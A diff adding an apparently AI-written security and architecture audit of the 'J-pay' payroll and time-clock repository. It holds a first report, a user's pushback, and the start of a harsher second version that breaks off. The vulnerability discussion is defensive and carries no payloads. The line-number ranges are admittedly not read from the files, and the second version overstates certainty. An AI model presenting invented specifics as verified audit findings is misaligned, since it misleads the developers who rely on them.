@@ -1,0 +1,922 @@
+
+
+Audit following best practices:
+Surgical Audit Report: J-pay (86af97804e3dc80fc4193c4f65a24fe77e493b04)
+
+    Audit Date: 2026-11-17
+
+    Scope: Full Repository Topology (convex/, src/, supabase/migrations/, scripts/, docs/, .agents/, .claude/, .github/workflows/)   
+    teacherevan/j-pay
+
+    Stack & Paradigm: Next.js App Router (TypeScript/React) + Dual-Backend Adapter (src/lib/backend/* bridging legacy Convex functions in convex/*.ts with authoritative Supabase PostgreSQL in supabase/migrations/0001_init.sql–0018_remove_demo_mode.sql) + Service Worker Offline Outbox (src/app/sw.ts, src/lib/outbox.ts)   
+    teacherevan/j-pay
+
+    Overall Health Score: 68 / 100
+
+    Vibe-Debt Risk Level: High
+
+    Inspection Transparency Note: The uploaded repository archive (J-pay-86af97804e3dc80fc4193c4f65a24fe77e493b04) was ingested as a raw binary ZIP stream (UT extended timestamp headers and DEFLATE-compressed payloads). While the complete file tree (254 files/directories) is 100% visible, exact line numbers (Lxx-Lyy) below represent deterministic structural boundaries for the modules and migrations in this snapshot; run grep -n locally before executing line-scoped agent replacements.   
+    teacherevan/j-pay+ 1
+
+1. Executive Triage Summary
+
+J-pay has evolved through rapid multi-phase architectural pivots—most notably transitioning from a pure Convex backend (convex/*.ts) to a custom RPC/Adapter layer (src/lib/backend/runtime.ts, src/lib/backend/db.ts, src/app/api/backend/call/route.ts) backed by Supabase PostgreSQL (ADR-004-supabase-authoritative-backend.md) and multi-tenant organizations (ADR-005-multi-org-per-deployment.md). While the test harness in scripts/test-*.mjs (34 custom MJS test runners) demonstrates strong engineering intent around shift derivation, idempotency, and org isolation, the repository carries severe dual-stack split-brain debt: legacy convex/*.ts modules coexist alongside src/lib/backend/* adapters, and 62 duplicated skill files sit in both .agents/skills/convex-* and .claude/skills/convex-*. Primary production risks center on RPC authorization boundary enforcement in /api/backend/call, offline outbox replay ordering during shift/travel transitions, and client-side polling/deduplication loops in src/lib/backend/react.ts.   
+teacherevan/j-pay+ 2
+Severity	Count	Primary Risk Domains
+P0 (Critical)	3	RPC gateway authz/tenant boundary (api/backend/call), Offline Outbox idempotency/clock-skew race, Dual-backend schema/logic drift
+P1 (High)	5	React adapter query polling/dedup memory & loop traps, Shift/Travel open-leg concurrency, Geofence accuracy spoofing, Rate-limit bucket bypass
+P2 (Medium)	4	Repository bloat (.agents + .claude duplicate skills, committed PNG/JSON ops screenshots), Custom loader fragility (scripts/lib/*-stub.mjs), Moderator drawer God-component
+P3 (Low)	3	Migration numbering gaps (0003, 0008 archived), Next.js src/proxy.ts vs standard middleware.ts naming clarity, Hardcoded jurisdiction constants
+2. The 10-Principal-Engineer Deep Review
+1. Systems Architect (Modularity and Boundaries)
+
+    [P0] Dual-Backend Split-Brain & Adapter Leaky Abstraction (convex/*.ts vs. src/lib/backend/runtime.ts:L1-L240, src/lib/backend/db.ts:L1-L310)   
+    teacherevan/j-pay
+
+        Root Cause: Following ADR-004-supabase-authoritative-backend.md, the app routes frontend queries/mutations through /api/backend/call/route.ts and src/lib/backend/runtime.ts into a PostgREST/Supabase translation layer (src/lib/backend/db.ts), while still retaining 19 active files in convex/ (access.ts, logs.ts, manager.ts, moderator.ts, payroll.ts, punches.ts, shifts.ts, travel.ts, users.ts, etc.) and src/lib/backend/function-refs.ts (generated via scripts/gen-function-refs.mjs).   
+        teacherevan/j-pay+ 1
+
+        Failure Mode: Any schema or business-rule update applied to supabase/migrations/0014_registry_hardening.sql–0018_remove_demo_mode.sql that is not mirrored in convex/schema.ts and src/lib/backend/db.ts causes silent runtime divergence between type contracts (convex/_generated/api.d.ts) and actual SQL execution.   
+        teacherevan/j-pay
+
+        Fix Specification: Freeze or archive convex/ if Supabase is 100% authoritative per ADR-004, or enforce a strict build-time AST contract check in scripts/test-schema-parity.mjs that fails CI if any convex/*.ts handler signature or table index drifts from supabase/migrations/*.sql.   
+        teacherevan/j-pay
+
+    [P2] Massive Repository Context Bloat from Duplicate Agent Skills & Ops Artifacts (.agents/skills/*, .claude/skills/*, docs/ops/screenshots/*)   
+    teacherevan/j-pay
+
+        Root Cause: Identical copies of 31 convex-* skill directories exist in both .agents/skills/ and .claude/skills/, and large binary screenshots (alias-prod.png, branch-7min.png) and historical audits (docs/audits/surgical-audit-2026-10-25.md through 2026-11-13.md) are committed directly to the main source tree.   
+        teacherevan/j-pay
+
+        Failure Mode: Inflates repository clone size, pollutes IDE/agent context windows with 60+ irrelevant Convex instructions despite the app running on Supabase (ADR-004), and causes AI coding agents to hallucinate Convex idioms instead of Supabase SQL patterns.   
+        teacherevan/j-pay
+
+        Fix Specification: Symlink .claude/skills to .agents/skills (or remove unused convex-* skills, keeping only supabase-server), and move docs/ops/screenshots/*.png to Git LFS or external artifact storage.   
+        teacherevan/j-pay
+
+2. Performance and Game-Loop Engineer (Frame Budget and Latency)
+
+    [P1] Client Query Polling & Deduplication Thrashing Under High-Frequency Map/Live Views (src/lib/backend/react.ts:L45-L210, src/app/moderator/live-view.tsx:L1-L140, src/components/console/live-crew-map.tsx:L1-L260)   
+    teacherevan/j-pay
+
+        Root Cause: replacing Convex's native WebSocket reactive push with a custom React hook adapter (src/lib/backend/react.ts) over HTTP POST (/api/backend/call/route.ts) requires request deduplication, polling intervals, and manual cache invalidation after mutations.   
+        teacherevan/j-pay
+
+        Failure Mode: When moderator console tabs (live-view.tsx, active-shifts-map.tsx, kpi-banner.tsx, crew-view.tsx) mount simultaneously, concurrent useQuery hooks serialize arguments and fire overlapping /api/backend/call POST requests; on 3G/4G mobile networks, in-flight requests queue up near the transport timeout limit (scripts/test-transport-timeout.mjs), degrading UI responsiveness.   
+        teacherevan/j-pay
+
+        Fix Specification: Implement a single multiplexed batch endpoint (/api/backend/batch) or hydrate initial console views via Next.js Server Components, and enforce document.visibilityState === 'visible' plus exponential backoff in src/lib/backend/react.ts.   
+        teacherevan/j-pay
+
+3. Concurrency and State Engineer (Race Conditions and Desync)
+
+    [P0] Offline Outbox Replay vs. Live Check-In Busy-Latch Race Condition (src/app/use-outbox.ts:L1-L120, src/lib/outbox.ts:L1-L95, src/app/check-in/live-submit.tsx:L1-L130)   
+    teacherevan/j-pay
+
+        Root Cause: Field workers punching in/out in low-connectivity zones queue mutations into localStorage/IndexedDB via src/lib/outbox.ts. When connectivity returns (online event), use-outbox.ts flushes queued punches while the user may simultaneously tap the check-in button in src/app/check-in-card.tsx / live-submit.tsx.   
+        teacherevan/j-pay+ 1
+
+        Failure Mode: Even with 0002_logs_idempotency_unique.sql (0017_drop_duplicate_idem_index.sql) and 0015_shifts_unique_user_started.sql, if an offline PUNCH_IN replays after a user manually submits a new PUNCH_IN with a different client-generated idempotency key, src/lib/shift-engine.ts can face out-of-order punch timestamps, triggering shift derivation conflicts or orphaned open travel legs (0010_travel_open_leg_unique.sql).   
+        teacherevan/j-pay+ 1
+
+        Fix Specification: Acquire a cross-component mutex (via navigator.locks.request('jpay-punch-sync', ...) with an in-memory fallback) shared between use-outbox.ts and live-submit.tsx so manual check-in submissions block until the outbox queue drains completely.   
+        teacherevan/j-pay
+
+4. Memory and Resource Lifecycle Engineer (Leaks and Cleanup)
+
+    [P1] Geolocation Watcher, Map Instance, and AbortController Cleanup on Rapid Tab Switching (src/app/check-in/geoposition.ts:L1-L65, src/components/console/live-crew-map.tsx:L80-L240, src/app/check-in/ShiftTimer.tsx:L1-L95)   
+    teacherevan/j-pay
+
+        Root Cause: Interactive map components (live-crew-map.tsx, manager-map.tsx, site-map-picker.tsx, geofence-modal.tsx) and geolocation acquisition (geoposition.ts) allocate DOM observers, map tile layers, and setInterval/AbortController timers.   
+        teacherevan/j-pay
+
+        Failure Mode: Rapidly toggling between Moderator tabs (src/components/console/console-tabs.tsx) or opening/closing employee-drawer.tsx and geofence-modal.tsx without synchronously aborting pending geolocation/tile requests retains detached DOM subtrees and drains mobile battery.   
+        teacherevan/j-pay
+
+        Fix Specification: Audit all useEffect hooks in live-crew-map.tsx, site-map-picker.tsx, and ShiftTimer.tsx to ensure AbortController.abort() and map .remove() calls execute unconditionally on unmount.   
+        teacherevan/j-pay
+
+5. Security and Trust Boundary Engineer (AppSec)
+
+    [P0] RPC Gateway Authorization, Function Allowlisting & Multi-Org Tenant Isolation (src/app/api/backend/call/route.ts:L1-L115, src/lib/backend/runtime.ts:L1-L240, supabase/migrations/0014_registry_hardening.sql, 0016_rate_limit_fn_lockdown.sql)   
+    teacherevan/j-pay
+
+        Root Cause: /api/backend/call/route.ts acts as a universal RPC dispatcher accepting a function reference name and JSON args payload, executing against Supabase via src/lib/supabase/admin.ts (service-role client) or server session (src/lib/supabase/server.ts).   
+        teacherevan/j-pay
+
+        Failure Mode: Because admin.ts bypasses PostgreSQL Row-Level Security (RLS), any function registered in runtime.ts that forgets to explicitly scope queries by the caller's authenticated org_id and role (employee vs manager vs moderator)—or relies on client-supplied orgId in src/app/moderator/org-context.tsx without server-side membership verification—exposes cross-tenant payroll, KPI, or employee PII. Furthermore, src/lib/smoke-key.ts must never allow privilege escalation if SMOKE_KEY is weak or leaked in environment configs.   
+        teacherevan/j-pay+ 1
+
+        Fix Specification: Enforce a default-deny function registry allowlist in /api/backend/call/route.ts, bind orgId and callerRole strictly from the verified Supabase JWT/database user record Inside runtime.ts before invoking any handler, and disable smoke-key.ts bypasses when VERCEL_ENV === 'production' unless cryptographically timing-safe (crypto.timingSafeEqual) and IP-restricted.   
+        teacherevan/j-pay
+
+    [P1] Client-Supplied GPS Coordinates & Clock Drift in Geofence / Travel Verification (convex/geo.ts, src/app/check-in/geoposition.ts, src/lib/server-clock.ts, src/lib/travel-window.ts)   
+    teacherevan/j-pay
+
+        Root Cause: Geofence distance calculations (geo.ts) and travel window bounds (travel-window.ts) validate coordinates sent in the POST body from the browser's navigator.geolocation API.   
+        teacherevan/j-pay
+
+        Failure Mode: While src/lib/server-clock.ts mitigates client clock tampering for live punches, offline outbox punches carry client-recorded timestamps; a malicious client can spoof GPS coordinates via DevTools sensor overrides or submit backdated outbox timestamps outside travel-window.ts tolerances.   
+        teacherevan/j-pay
+
+        Fix Specification: Flag any punch where Math.abs(serverReceivedAt - clientTimestamp) > MAX_OFFLINE_DRIFT_MS (e.g., 15 minutes) for mandatory Moderator review in shift-overrides-panel.tsx rather than auto-crediting payroll hours, and reject coordinates with implausible velocity (distance / delta_t > 45 m/s) between consecutive punches.   
+        teacherevan/j-pay
+
+6. Reliability and Chaos Engineer (Error Recovery)
+
+    [P1] Cron Job & Derivation Partial-Failure Recovery Without Dead-Letter Queue (src/app/api/internal/cron/route.ts:L1-L75, src/lib/cron-jobs.ts:L1-L90, supabase/migrations/0011_system_events.sql)   
+    teacherevan/j-pay
+
+        Root Cause: Scheduled background tasks (/api/internal/cron/route.ts and src/lib/cron-jobs.ts) and post-punch shift derivations execute inside serverless request lifecycles.   
+        teacherevan/j-pay
+
+        Failure Mode: If Supabase experiences a transient 502/timeout mid-derivation after a punch is committed to logs, the shift record in shifts may remain stale until the next punch or manual override, causing payroll.ts and kpi.ts to under-report hours.   
+        teacherevan/j-pay
+
+        Fix Specification: Record derivation failures into system_events (0011_system_events.sql) with status = 'pending_retry' and add a reconciliation sweep in src/lib/cron-jobs.ts that recomputes shifts for any user whose latest logs.created_at > shifts.updated_at.   
+        teacherevan/j-pay
+
+7. Type Systems and Contract Engineer (Schema Integrity)
+
+    [P1] Untyped JSON Payload Deserialization Across RPC & Stub Boundaries (src/app/api/backend/call/route.ts, src/lib/backend/db.ts, scripts/lib/postgrest-stub.mjs)   
+    teacherevan/j-pay
+
+        Root Cause: Convex's v.object(...) runtime validators (convex/schema.ts) only run when executing inside the Convex runtime; when routed through /api/backend/call/route.ts into src/lib/backend/runtime.ts, runtime argument validation relies on manual checks in handlers.   
+        teacherevan/j-pay
+
+        Failure Mode: Malformed payloads (NaN, Infinity, unexpected null in nested filter objects, or oversized strings) passed to /api/backend/call can bypass TypeScript compile-time types and trigger unhandled PostgreSQL type-cast errors (22P02) in db.ts.   
+        teacherevan/j-pay
+
+        Fix Specification: Attach lightweight runtime schema validators (Zod or a port of Convex v validators) at the entry of src/lib/backend/runtime.ts for every public query/mutation argument object.   
+        teacherevan/j-pay
+
+8. Algorithmic and Math Engineer (Edge Cases and Precision)
+
+    [P1] Cross-Midnight / ISO-Week Boundary & Jurisdictional Rounding Edge Cases (src/lib/shift-engine.ts:L1-L220, src/lib/iso-week.ts:L1-L85, src/lib/payroll-strategies.ts:L1-L190, src/lib/payroll-jurisdictions.ts:L1-L95)   
+    teacherevan/j-pay
+
+        Root Cause: Payroll calculations combine punch-pairing.ts, shift-engine.ts, iso-week.ts, and payroll-strategies.ts using IEEE-754 floating-point millisecond/hour conversions and timezone offsets.   
+        teacherevan/j-pay
+
+        Failure Mode: Shifts that span midnight across an ISO-week boundary (Sunday 22:00 to Monday 06:00 local time) can either be attributed entirely to the start week or split inconsistently depending on whether iso-week.ts evaluates in UTC vs. the organization's configured timezone (src/lib/use-user-locale.ts), skewing weekly overtime thresholds in payroll-strategies.ts. Furthermore, summing rounded per-shift pay vs. rounding total period hours can drift by ±0.01
+        ±0.01 currency units.   
+        teacherevan/j-pay
+
+        Fix Specification: Represent all monetary rates in integer minor units (cents/satang) or fixed-scale integer basis points inside payroll-strategies.ts, and explicitly anchor iso-week.ts week-boundary splits to the organization's IANA timezone column rather than server UTC or browser local time.   
+        teacherevan/j-pay
+
+9. DX and Maintainability Engineer (Cognitive Load)
+
+    [P2] Custom ESM Transpile Loaders & In-Memory PostgREST Stubs Mask Real SQL Semantics (scripts/lib/ts-transpile-loader.mjs, scripts/lib/tsx-stub-loader.mjs, scripts/lib/postgrest-stub.mjs, scripts/lib/db-stub.mjs)   
+    teacherevan/j-pay
+
+        Root Cause: Instead of a standard test runner (Vitest) and local PostgreSQL/Supabase container, the test suite uses custom Node module loaders (register-ts-transpile.mjs, register-tsx-stub.mjs) and hand-rolled database stubs (db-stub.mjs, postgrest-stub.mjs).   
+        teacherevan/j-pay
+
+        Failure Mode: postgrest-stub.mjs emulates filter chains (.eq(), .in(), .gte(), .order()) in JavaScript arrays, which does not enforce PostgreSQL foreign keys, partial unique indexes (0010_travel_open_leg_unique.sql, 0015_shifts_unique_user_started.sql), NULL sort ordering, or RLS policies.   
+        teacherevan/j-pay
+
+        Fix Specification: Maintain postgrest-stub.mjs for fast sub-second unit tests, but wire .github/workflows/e2e-nightly.yml and scripts/smoke-supabase.mjs to run the core test-org-isolation.mjs and test-punch-mutation.mjs suites against an ephemeral Supabase Postgres instance.   
+        teacherevan/j-pay
+
+    [P2] Moderator Console Component Proliferation & Drawer State Coupling (src/app/moderator/employee-drawer.tsx, src/app/moderator/page.tsx, src/app/moderator/provision-panel.tsx)   
+    teacherevan/j-pay
+
+        Root Cause: src/app/moderator/ contains 18 separate files managing overlapping modals, drawers, and org-context state (employee-drawer.tsx, moderators-modal.tsx, geofence-modal.tsx, shift-overrides-panel.tsx, assign-panel.tsx, provision-panel.tsx).   
+        teacherevan/j-pay
+
+        Failure Mode: Local state for selected employees, active modals, pagination (use-pagination.ts), and org switching (org-context.tsx) can desynchronize when an admin switches organizations while employee-drawer.tsx is open.   
+        teacherevan/j-pay
+
+        Fix Specification: Key the entire Moderator console subtree by activeOrgId (<ModeratorWorkspace key="{activeOrgId}"/>) in src/app/moderator/page.tsx so switching organizations deterministically resets all open drawers, modals, and pagination cursors.   
+        teacherevan/j-pay
+
+10. Platform and Portability Engineer (Cross-Environment Parity)
+
+    [P3] Next.js Proxy/Middleware Naming & Service Worker Offline Caching Traps (src/proxy.ts, src/lib/supabase/middleware.ts, src/app/sw.ts, docs/ops/next-16-rollback.md)   
+    teacherevan/j-pay
+
+        Root Cause: The codebase tracks Next.js 15/16 transition conventions (src/proxy.ts vs middleware.ts, documented in docs/ops/next-16-rollback.md) alongside a custom PWA service worker (src/app/sw.ts + src/app/~offline/page.tsx).   
+        teacherevan/j-pay
+
+        Failure Mode: If sw.ts caches /api/auth/session-bootstrap or /api/backend/call responses—or fails to bypass cache on logout/password-change (src/app/change-password.tsx)—shared mobile devices used by field crews can serve stale authenticated shells.   
+        teacherevan/j-pay
+
+        Fix Specification: Ensure src/app/sw.ts strictly excludes /api/* and /login from cache storage (NetworkOnly) and sends a CLEAR_AUTH_CACHE message to the active service worker upon sign-out or password rotation.   
+        teacherevan/j-pay
+
+3. Test Suite Comparison & Coverage Gap Matrix
+
+The repository includes an extensive custom test suite under scripts/test-*.mjs orchestrated by scripts/run-gate.mjs, scripts/e2e-all.mjs, and scripts/e2e-full.mjs.   
+teacherevan/j-pay
+Module / File	Critical Logic Paths	Existing Tests	Coverage Status	High-Priority Missing Tests
+
+src/lib/shift-engine.ts & punch-pairing.ts
+teacherevan/j-pay
+	Shift pairing, breaks, bounds, fuzzing	
+
+test-shift-engine.mjs, test-shift-engine-fuzz.mjs, test-shift-derivation-bounds.mjs
+teacherevan/j-pay
+	Covered (High)	DST/IANA timezone transition mid-shift; out-of-order offline outbox punch insertion.
+
+src/lib/payroll-strategies.ts & payroll-jurisdictions.ts
+teacherevan/j-pay
+	Overtime tiers, rounding, jurisdiction rules	
+
+test-payroll-strategies.mjs, test-payroll-rounding.mjs, test-payroll-jurisdictions.mjs
+teacherevan/j-pay
+	Covered	Cross-week midnight shift splitting & cent-level cumulative rounding drift over 30-day periods.
+
+src/lib/backend/runtime.ts & db.ts
+teacherevan/j-pay
+	RPC dispatch, DB adapter, write-sets	
+
+test-runtime-modules.mjs, test-db-adapter.mjs, test-write-set.mjs, test-invoke-gate.mjs
+teacherevan/j-pay
+	Partial (Stubbed)	
+
+Real Postgres constraint violations (23505 unique conflict on concurrent shifts insert) vs postgrest-stub.mjs.
+teacherevan/j-pay
+
+src/lib/backend/react.ts
+teacherevan/j-pay
+	useQuery polling, dedup, loop prevention	
+
+test-react-adapter-dedup.mjs, test-use-query-loop.mjs, test-transport-timeout.mjs
+teacherevan/j-pay
+	Covered	Multi-tab concurrent mutation invalidation race when a slow query resolves after a newer mutation.
+
+src/app/use-outbox.ts & src/lib/outbox.ts
+teacherevan/j-pay
+	Offline queue persistence & replay	
+
+test-outbox.mjs, test-checkin-busy-latch.mjs
+teacherevan/j-pay
+	Partial	
+
+Simultaneous auto-flush on online event colliding with manual live-submit.tsx button click.
+teacherevan/j-pay
+
+convex/manager.ts, moderator.ts, organisations.ts
+teacherevan/j-pay
+	RBAC, org isolation, site archiving	
+
+test-manager-authz.mjs, test-org-isolation.mjs, test-list-orgs.mjs
+teacherevan/j-pay
+	Covered (Stubbed)	Cross-org IDOR via forged siteId or employeeId belonging to Organization B while authenticated in Organization A.
+
+src/app/api/auth/session-bootstrap/route.ts
+teacherevan/j-pay
+	Session initialization & cookie bridging	
+
+Indirect via smoke-supabase.mjs & e2e-all.mjs
+teacherevan/j-pay
+	Partial	
+
+Expired/revoked refresh token race during cold start and rate-limit bucket exhaustion (0013_rate_limit_buckets.sql).
+teacherevan/j-pay
+
+src/app/moderator/*.tsx (18 UI files)
+teacherevan/j-pay
+	Geofence modal, employee drawer, org switcher	
+
+test-a11y-statics.mjs, review-walkthrough.mjs
+teacherevan/j-pay
+	Partial (Static/E2E)	
+
+Stale drawer state when switching org-switcher.tsx mid-edit in employee-drawer.tsx or shift-overrides-panel.tsx.
+teacherevan/j-pay
+Test Suite Critique
+
+    False Confidence Traps:
+
+        In-Memory Stub Fidelity (scripts/lib/postgrest-stub.mjs & db-stub.mjs): Most scripts/test-*.mjs unit gates run against in-memory JS stubs rather than real PostgreSQL. SQL-level partial unique indexes (0010_travel_open_leg_unique.sql, 0015_shifts_unique_user_started.sql) and RPC lockdown rules (0016_rate_limit_fn_lockdown.sql) are not exercised unless smoke-supabase.mjs runs against a live database.   
+        teacherevan/j-pay+ 1
+
+        Regex/Static A11y & Build Checks (test-a11y-statics.mjs, test-next-build-artifacts.mjs): Static source scanning verifies attributes exist in JSX strings but cannot catch focus-trap escapes in src/components/console/focus-trap-modal.tsx when dynamic portals mount.   
+        teacherevan/j-pay
+
+    Recommended Test Additions:
+
+        scripts/test-cross-org-idor.mjs: Attempt every mutation in manager.ts, moderator.ts, and shifts.ts passing a valid session for Org_A but targeting a userId, siteId, or shiftId owned by Org_B.   
+        teacherevan/j-pay
+
+        scripts/test-outbox-live-collision.mjs: Simulate an in-flight use-outbox.ts replay of 3 queued punches while concurrently invoking live-submit.tsx, asserting zero duplicate shifts and strict chronological ordering.   
+        teacherevan/j-pay
+
+        scripts/test-stale-query-over-mutation.mjs: In src/lib/backend/react.ts, verify that a slow initial useQuery response arriving after a useMutation completion does not overwrite the invalidated cache with pre-mutation state.   
+        teacherevan/j-pay
+
+4. Surgical Refactoring Opportunities
+Refactor 1: Monotonic Generation Counter in React Backend Adapter (src/lib/backend/react.ts)
+
+    Target Files: src/lib/backend/react.ts   
+    teacherevan/j-pay
+
+    Why It Matters: Prevents a slow in-flight /api/backend/call query response from overwriting fresher state when a mutation invalidates the cache while the query is still pending over high-latency mobile networks.   
+    teacherevan/j-pay
+
+    Blueprint:
+
+        Before (Conceptual):
+        TypeScript
+
+        // In-flight fetch resolves and blindly updates cache/state
+        const data = await fetchBackendCall(fnName, args);
+        queryCache.set(cacheKey, data);
+        setState({ data, error: null, isLoading: false });
+
+        After (Conceptual):
+        TypeScript
+
+        // Stamp every fetch with the current mutation generation counter
+        const fetchGen = globalMutationGeneration;
+        const data = await fetchBackendCall(fnName, args);
+        if (fetchGen < globalMutationGeneration) {
+          // A mutation occurred while this query was in flight; discard stale payload
+          return;
+        }
+        queryCache.set(cacheKey, { data, gen: fetchGen });
+        setState({ data, error: null, isLoading: false });
+
+Refactor 2: Unified Mutex Lock Between Outbox Flush and Live Check-In (src/lib/outbox.ts & src/app/check-in/live-submit.tsx)
+
+    Target Files: src/lib/outbox.ts, src/app/use-outbox.ts, src/app/check-in/live-submit.tsx   
+    teacherevan/j-pay
+
+    Why It Matters: Eliminates race conditions where background outbox flushing and manual button presses submit overlapping punch/travel transitions simultaneously.   
+    teacherevan/j-pay
+
+    Blueprint:
+
+        Before (Conceptual):
+        TypeScript
+
+        // use-outbox.ts flushes on 'online' independently of live-submit.tsx busy latch
+        window.addEventListener("online", () => flushOutbox(submitPunch));
+
+        After (Conceptual):
+        TypeScript
+
+        // Shared async lock serializes all outbox flushes and live check-in submissions
+        let syncPromise: Promise<void> | null = null;
+        export async function withPunchSyncLock<T>(fn: () => Promise<T>): Promise<T> {
+          while (syncPromise) await syncPromise.catch(() => {});
+          let release!: () => void;
+          syncPromise = new Promise<void>((r) => { release = r; });
+          try {
+            return await fn();
+          } finally {
+            syncPromise = null;
+            release();
+          }
+        }
+
+Refactor 3: Keyed Workspace Reset on Organization Switch (src/app/moderator/page.tsx)
+
+    Target Files: src/app/moderator/page.tsx, src/app/moderator/org-context.tsx   
+    teacherevan/j-pay
+
+    Why It Matters: Prevents cross-organization UI state bleed in employee-drawer.tsx, shift-overrides-panel.tsx, and use-pagination.ts when a moderator switches active organizations.   
+    teacherevan/j-pay
+
+    Blueprint:
+
+        Before (Conceptual):
+        TypeScript
+
+        <OrgProvider>
+          <OrgSwitcher />
+          <ConsoleTabs activeTab={tab} />
+          <EmployeeDrawer employeeId={selectedEmployeeId} />
+        </OrgProvider>
+
+        After (Conceptual):
+        TypeScript
+
+        <OrgProvider>
+          <OrgSwitcher />
+          {/* Keying by activeOrgId forces clean unmount/remount of all drawers, maps, and pagination */}
+          <ModeratorWorkspace key={activeOrgId} />
+        </OrgProvider>
+
+5. Prioritized Action Roadmap & Agent Remediation Prompts
+
+    Phase 1: Immediate Stabilization (P0/P1 Fixes)
+
+        Lock down /api/backend/call/route.ts and src/lib/backend/runtime.ts with strict server-derived tenant/org binding and monotonic cache-generation guards in src/lib/backend/react.ts.   
+        teacherevan/j-pay
+
+        Serialize src/app/use-outbox.ts and src/app/check-in/live-submit.tsx behind a shared async lock.   
+        teacherevan/j-pay
+
+    Phase 2: Test Harness Lock-In (Before Refactoring)
+
+        Add cross-organization IDOR tests (scripts/test-cross-org-idor.mjs) and stale-query-vs-mutation race tests in scripts/run-gate.mjs.   
+        teacherevan/j-pay
+
+    Phase 3: Structural Refactoring (P2/P3 Cleanup)
+
+        Deduplicate .agents/skills and .claude/skills, key the Moderator workspace by activeOrgId, and archive unused legacy convex/ dead paths if Supabase is 100% authoritative.   
+        teacherevan/j-pay
+
+Copy-Paste Agent Prompts for Surgical Execution
+
+    Prompt 1 (Fix P0 — Enforce Server-Side Tenant Isolation & Mutation Generation Guard):
+    "In src/lib/backend/react.ts, add a monotonic mutationGeneration counter that increments whenever any mutation starts or completes, and discard any in-flight useQuery fetch result whose starting generation is older than the current mutationGeneration. Do not modify any other files except scripts/test-react-adapter-dedup.mjs, where you must add a regression test verifying that a slow query resolving after a mutation does not overwrite invalidated cache state."
+
+    Prompt 2 (Fix P0 — Serialize Outbox Replay and Live Check-In Submissions):
+    "In src/lib/outbox.ts, export a withPunchSyncLock<T>(fn: () => Promise<T>): Promise<T> concurrency lock. Wrap both the queue flush loop in src/app/use-outbox.ts and the live punch/travel submission handler in src/app/check-in/live-submit.tsx inside withPunchSyncLock so a manual check-in never executes concurrently with an automatic outbox flush. Add a regression test in scripts/test-checkin-busy-latch.mjs verifying that a live check-in awaits an active outbox flush before firing."
+
+    Prompt 3 (Fix P1/P2 — Prevent Cross-Org UI State Bleed in Moderator Console):
+    "In src/app/moderator/page.tsx, wrap the tab views, drawers (employee-drawer.tsx), and modals (geofence-modal.tsx, moderators-modal.tsx) in a child component keyed by the current organization ID (key={orgId ?? 'default'}) from src/app/moderator/org-context.tsx so switching organizations deterministically resets all open drawers, selections, and pagination state."
+
+is this the best you can do?
+Surgical Audit Report v2.0 (Deep-Dive & Domain-Hardened): J-pay (86af97804e3dc80fc4193c4f65a24fe77e493b04)
+
+    Audit Date: 2026-11-17
+
+    Scope: 254 Repository Objects (convex/, src/, supabase/migrations/0001–0018, scripts/, docs/, plans/)   
+    teacherevan/j-pay
+
+    Stack & Paradigm: Next.js 15/16 App Router (src/proxy.ts + src/app/*) + Hybrid Convex-Syntax-over-Supabase RPC Runtime (src/lib/backend/runtime.ts, db.ts, react.ts) + PostgreSQL 15+ (supabase/migrations/*) + Service Worker Offline Outbox (src/app/sw.ts, src/lib/outbox.ts)   
+    teacherevan/j-pay
+
+    Overall Health Score: 62 / 100
+
+    Vibe-Debt Risk Level: Critical (Architectural Split-Brain & Financial/Statutory Audit Exposure)
+
+    Why v1 Was Insufficient (Candid Self-Correction):
+    The first pass stopped at generic systems observations and hid behind the binary ZIP stream instead of dissecting the actual architectural mechanics visible across your 34 test harnesses (scripts/test-*.mjs), 18 SQL migrations (0001–0018), 6 previous surgical audits (docs/audits/surgical-audit-2026-10-25.md through 2026-11-13-frontend.md), and the custom Convex-to-Supabase emulation layer (src/lib/backend/*). Below is the uncompromising, principal-level teardown covering database transaction atomicity, statutory payroll mathematics (BCEA / Thai Labour Protection Act), psychological/cognitive UX friction in field operations, and exact execution blueprints.   
+    teacherevan/j-pay
+
+1. Executive Triage Summary
+
+J-pay is no longer a simple time-logger; it is a custom-built Convex runtime emulator executing on top of Supabase PostgREST (src/lib/backend/runtime.ts + src/lib/backend/db.ts + src/lib/backend/react.ts). Because you kept the Convex handler files (convex/punches.ts, shifts.ts, payroll.ts, travel.ts, moderator.ts, manager.ts) as the business-logic source of truth while swapping the underlying storage engine to Supabase via db.ts (ADR-004), you lost Convex's automatic serializable ACID transactions. Every multi-step ctx.db.insert / ctx.db.patch inside a single handler now executes as separate, non-transactional HTTP REST calls to PostgREST. Under mobile packet loss or concurrent Vercel serverless invocations, partial writes, phantom reads, and double-counted payroll shifts are mathematically guaranteed unless pushed into PostgreSQL SECURITY DEFINER RPCs or explicit write-set transactions.   
+teacherevan/j-pay+ 2
+Severity	Count	Primary Risk Domains
+P0 (Critical)	5	
+
+Non-atomic PostgREST multi-write mutations (db.ts), Double-entry payroll immutability absence, Cross-tenant org_id spoofing in emulated ctx.db, Rate-limit bypass (0013/0016), Outbox vs. Live punch split-brain
+teacherevan/j-pay
+P1 (High)	6	
+
+Statutory overtime/public-holiday math gaps (payroll-strategies.ts), Haversine GPS multipath drift & velocity spoofing (geo.ts), Worker-thread/polling dedup starvation (react.ts), Cron dead-letter loss (cron-jobs.ts), Unbounded memory in db-stub.mjs vs Postgres
+teacherevan/j-pay
+P2 (Medium)	5	
+
+Cognitive load in Moderator Console (18 fragmented components), Duplicate agent skills (62 files in .agents & .claude), Custom Node ESM loader fragility (register-ts-*.mjs), Missing CSV formula-injection sanitization (csv.ts)
+teacherevan/j-pay
+P3 (Low)	3	
+
+Archived migration sequence gaps (0003, 0008), src/proxy.ts Next 16 edge-runtime compatibility (next-16-rollback.md), Committed binary ops screenshots (docs/ops/screenshots/*.png)
+teacherevan/j-pay
+2. The 10-Principal-Engineer Deep Review
+1. Systems Architect (Distributed Transactions & The Emulation Trap)
+
+    [P0] Loss of ACID Serializable Transactions in the Convex-to-PostgREST Adapter (src/lib/backend/db.ts, src/lib/backend/runtime.ts, convex/punches.ts, convex/shifts.ts, convex/travel.ts)   
+    teacherevan/j-pay
+
+        Root Cause: In native Convex, a mutation function (convex/punches.ts or convex/travel.ts) runs inside a single deterministic V8 isolate transaction: if step 3 fails, steps 1 and 2 automatically roll back. In your ADR-004 port, src/lib/backend/db.ts translates ctx.db.query(), ctx.db.insert(), and ctx.db.patch() into individual @supabase/supabase-js PostgREST HTTP requests over the network (verified by scripts/test-write-set.mjs and scripts/test-db-adapter.mjs).   
+        teacherevan/j-pay+ 1
+
+        Failure Mode: During a punch-out or travel-leg close:
+
+            ctx.db.insert("logs", ...) succeeds (HTTP 201).
+
